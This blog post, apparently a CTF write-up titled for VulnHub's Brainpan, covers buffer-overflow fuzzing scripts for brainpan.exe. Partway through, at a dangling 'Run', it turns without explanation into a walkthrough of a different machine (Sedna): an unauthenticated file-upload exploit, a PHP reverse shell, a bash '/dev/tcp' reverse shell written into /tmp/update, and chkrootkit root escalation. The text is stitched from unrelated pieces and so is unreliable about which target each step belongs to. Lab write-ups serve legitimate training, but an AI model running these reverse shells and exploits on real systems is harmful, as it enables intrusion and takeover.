---
layout: post
title: PenLog - Brainpan by VulnHub
categories: [VulnHub, Penlog, Write Up, CTF, OSCP]
---

## Details

**Platform:** [VulnHub](https://www.vulnhub.com/)\
**Difficulty:** Medium\
**Link:** [Brainpan: 1](https://www.vulnhub.com/entry/brainpan-1,51/)

## Enumeration

Run `netdiscover` to find the IP address of the VM:

```bash
$ netdiscover -i vmnet1
192.168.42.131  00:0c:29:9a:47:01      1      42  VMware, Inc.
```

Run `nmap` default port scan on target with TCP connect/version/script options:
```bash
$ nmap -vv -Pn -sT -sV -sC 192.168.42.131
```

This results in:

![nmap1](/images/posts/penlog_brainpan_by_vulnhub/nmap1.png)

Using `telnet` confirm network application exposed by target on port tcp/9999:

```bash
$ telnet 192.168.42.131 9999
...
```

![telnet](/images/posts/penlog_brainpan_by_vulnhub/telnet.png)

_(**Note:** Given Brainpan's popularity as an "OCSP-like" buffer overflow, I assumed the above exposed service is a binary that can be downloaded for offline analysis.)_

Run `dirbuster` against the target's open http port 10000 using the _/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt_ wordlist and
options _Be Recursive_ switched off, and _File extension_ set to _html, php, txt_.

![dirbuster](/images/posts/penlog_brainpan_by_vulnhub/dirbuster.png)

Note **/bin** in the result; navigate to this in the browser and download the hosted executable **brainpan.exe**:

![bin](/images/posts/penlog_brainpan_by_vulnhub/bin.png)

Run `file` over the executable and confirm executable format:

```bash
$ file brainpan.exe
brainpan.exe: PE32 executable (console) Intel 80386 (stripped to external PDB), for MS Windows
```

Load brainpan.exe into Immunity Debugger on a Windows VM:

![windows-vm](/images/posts/penlog_brainpan_by_vulnhub/windows_vm.png)

Construct and execute a fuzzing PoC with Python using `pwntools` to find overflow:

```python
from pwn import *

context(os="windows", arch="x86")
context.log_level="DEBUG"

ip="192.168.42.132"  # Windows XP VM running Immunity
port=9999

for i in range (0,1000,100):
    p = remote(ip, port)
    p.recvuntil(">> ")
    p.send('A' * i)

# brainpan.exe crashed at 601 bytes
```

![fuzzing](/images/posts/penlog_brainpan_by_vulnhub/fuzzing.png)
_(**Note:** In the above, 0x259-bytes is 601-bytes in decimal.)_\
_(**Note:** Notice ECX "shitstorm"; I expect this is the comparison password used in a `strcmp`. Confirmed by passing as input to ">> "; brainpan does nothing after successful authentication.)_

Restart brainpan.exe with Immunity Debugger.

Create a random byte string of length 601-bytes using Metasploit's _pattern_create.rb_:

```bash
/opt/metasploit-framework/embedded/framework/tools/exploit/pattern_create.rb -l 601
...
```

Copy random byte string into previously created fuzzing PoC and execute (remember to restart crashed brainpan with Immunity Debugger):

```python
from pwn import *

context(os="windows", arch="x86")
context.log_level="DEBUG"

ip="192.168.42.132"  # Windows XP VM running Immunity
port=9999

p = remote(ip, port)
p.recvuntil(">> ")
pattern = 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9A'
p.send(pattern)
```

Run

Continuing through the `DirBuster` results, note **/finder.html**, which, when navigated to in the browser,
has the title: **elFinder 2.0**.

Searching Google, there is a **BuilderEngine** project on GitHub at [tripflex/builder-engine]() with the
description: _"Open source CMS HTML 5 website builder."_

Taking a chance on this, use `searchsploit` and evaluate results:

```bash
$ searchsploit enginebuilder
...
```

![searchsploit](/images/posts/penlog_sedna_by_vulnhub/searchsploit_enginebuilder.png)

Download the non-Metasploit PoC with EDB-ID [40390](https://www.exploit-db.com/exploits/40390):

```bash
$ searchsploit -m 40390
```

### 40390 Description

40390 reports EngineBuilder v3.5.0 as having a Remote Code Execution vulnerability; reading the PoC, it describes the ability to perform Arbitrary File Upload via unauthenticated, unrestricted access to a bundled jQuery File Upload plugin _/themes/dashboard/assets/plugins/jquery-file-upload_.

With this file upload capability, upload a reverse PHP shell--the website is serving PHP--to establish a low-privilege _user_ shell.

## User Shell

Copy 40390, changing the extension from _.php_ to _.html_:

```bash
$ cp 40390.{php,html}
```

Update the PoC's action string to instead include the target IP address:

```bash
$ diff 40390.html 40390.php
22c22
< <form method="post" action="http://192.168.42.130/themes/dashboard/assets/plugins/jquery-file-upload/server/php/" enctype="multipart/form-data">
---
> <form method="post" action="http://localhost/themes/dashboard/assets/plugins/jquery-file-upload/server/php/" enctype="multipart/form-data">
27c27
< </html>
---
> </html>
\ No newline at end of file
```

Copy _/usr/share/webshells/php/php-reverse-shell.php_ from Kali's bundled webshells and update the connect back IP address/port to be the attacking IP address/port:

![php-webshell](/images/posts/penlog_sedna_by_vulnhub/php_webshell.png)

Serve the _html_ version of 40390 locally and upload the modified _php-reverse-shell.php_:

![40390-upload](/images/posts/penlog_sedna_by_vulnhub/40390_upload.png)

As noted in the documentation, 40390 advises that the uploaded shell will be accessible via _/files_:

![files-list](/images/posts/penlog_sedna_by_vulnhub/files_list.png)

Start an `nc` lister on the port that was added to the modified _php-reverse-shell.php_:

```bash
$ nc -vnlp 4444
```

Click the _php-reverse-shell.php_ link in the browser and establish a reverse shell connection:

![user-shell](/images/posts/penlog_sedna_by_vulnhub/user_shell.png)
_(**Note:** "reverse" in the above is a bash alias for `nc -vnlp 4444`.)_

Get the user _flag.txt_:

![user-flag](/images/posts/penlog_sedna_by_vulnhub/user_flag.png)

Lastly, upgrade the shell with a PTY:

```bash
$ python -c 'import pty; pty.spawn("/bin/bash")'
$ (Ctrl-Z)
$ stty raw -echo
$ fg
$ export TERM=xterm && reset
```

(After spending an hour looking at some other installed, vulnerable software, and attempting _Dirty Cow_ for this vulnerable _Linux Kernel v3.13.0-32_, I discovered a vector via `cron`.)

Upload and execute custom `cronmon.sh`:

```bash
$ cat cronmon.sh
#!/bin/bash

#IFS=$'\n'

old_process=$(ps -eo command)  # sort by command (-o)

while true; do
    new_process=$(ps -eo command)
    diff <(echo "$old_process") <(echo "$new_process")
    sleep .2
    old_process=$new_process
done
```

After a while, notice `chkrootkit` in the output, running as **root**:

![chkrootkit-cron-root](/images/posts/penlog_sedna_by_vulnhub/chkrootkit_cron_root.png)

Notice path _/etc/chkrootkit_ on target (non-standard) and version string in _/etc/chkrootkit/README_:

```bash
$ cat /etc/chkrootkit/README
...
 09/30/2009 - Version 0.49  new tests: Mac OS X OSX.RSPlug.A.  Enhanced
                            tests: suspicious sniffer logs, suspicious
                            PHP files, shell history file anomalies.
                            Bug fixes in chkdirs.c, chkproc.c and
                            chkutmp.c.
```

Search for a local privilege escalation with `searchsploit` and download the non-Metasploit PoC **33899**:

![33899-chkrootkit](/images/posts/penlog_sedna_by_vulnhub/33899_chkrootkit.png)
_(**Note:** "ss" in the above is a bash alias for `searchsploit`.)_

### 33899 Description

33899 reports chkrootkit v0.49 as having a vulnerable function that will execute files specified in a variable due to unquoted variable assignment. The PoC goes on to describe _"Steps to reproduce"_:
- Put an executable file named 'update' in /tmp
- Run chkrootkit (as uid 0)

## Root Shell

Follow the instructions and put the file with a bash reverse shell to attacking machine:

```bash
$ echo "bash -i >& /dev/tcp/192.168.42.129/4445 0>&1" > /tmp/update
$ chmod +x /tmp/update
```

Start `nc` listener on the attacking machine, specifying expected reverse shell port (4445 in this case):

```bash
$ nc -vnlp 4445
```

Wait for `cron` to execute `chkrootkit` as root; reading _/etc/crontab_, the root _/etc/cron.hourly_ will run every **17 min**:

![root-cron-hourly](/images/posts/penlog_sedna_by_vulnhub/root_cron_hourly.png)

After _/tmp/update_ is executed as _root_ via the `cron` call to `chkrootkit`, get the root _flag.txt_ via the established root shell:

![root-shell](/images/posts/penlog_sedna_by_vulnhub/root_shell.png)
